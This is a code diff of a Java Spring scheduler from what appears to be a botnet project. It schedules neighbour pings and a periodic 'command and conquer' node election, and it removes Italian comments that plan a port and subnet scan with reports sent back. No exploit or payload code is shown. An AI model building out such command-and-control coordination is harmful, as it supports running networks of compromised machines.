@@ -31,37 +31,22 @@ public class ScheduledTasksNet {
 	private Config configEngine;
 	@Autowired
 	private Behavior botB;
-	
 
-	
-	@Scheduled(initialDelay=100000,fixedRate = 100000)
+	@Scheduled(initialDelay = 100000, fixedRate = 100000)
 	public void pingNeighbours() {
-			botB.pingToNeighbours();
+		botB.pingToNeighbours();
 	}
-	
-	
-	@Scheduled(initialDelay=200000, fixedRate = 220000)
+
+	@Scheduled(initialDelay = 200000, fixedRate = 220000)
 	public void electionDay() {
-		if (configEngine.isCommandandconquerStatus()){
+		if (configEngine.isCommandandconquerStatus()) {
 			cmm.startElection();
 		}
 	}
-	
+
 	@Scheduled(fixedRate = 500000)
 	public void pingVicinato() {
 
-	
 		log.info("The time is now {}", dateFormat.format(new Date()));
 	}
-
-	// se sei il cec ricalcola il grafo sulla base del vecchio con Updatenetwork
-	// ogni tot tempo e se la lista dei nodi è cambiata
-	// poi spamma la list anuova
-
-	// eleggere nuovo gruppo di cec e spammare ai bot il nuovo gruppo da cui
-	// eseguire chiamate
-
-	// Scan porte e sottorete + invio report?= sarebbe sgravo se fatto
-
-
 }
